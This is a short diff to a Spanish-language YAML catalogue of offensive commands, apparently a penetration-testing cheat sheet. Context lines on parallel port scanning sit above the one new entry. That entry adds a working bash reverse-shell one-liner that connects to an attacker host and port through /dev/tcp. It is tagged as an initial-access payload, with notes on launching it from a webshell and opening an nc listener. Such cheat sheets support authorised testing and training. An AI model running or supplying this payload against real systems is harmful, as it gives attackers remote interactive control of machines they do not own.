@@ -53,3 +53,15 @@ commands:
     notes: >-
       Prueba los 1024 primeros puertos en paralelo. Para otros rangos cambia el seq, pero ve por
       tramos: con los 65 535 a la vez la máquina se queda sin procesos.
+
+  - id: bash-revshell
+    title: Reverse shell con bash y /dev/tcp
+    cmd: |
+      bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1
+    phase: initial-access
+    area: shells
+    tags: [reverse-shell, payloads]
+    notes: >-
+      /dev/tcp es una función de bash (no existe en sh ni en dash): lánzala con bash. Desde una webshell
+      o un system() va envuelta en bash -c. Pon antes un listener con nc -lvnp.
+    refs: [https://github.com/swisskyrepo/PayloadsAllTheThings]
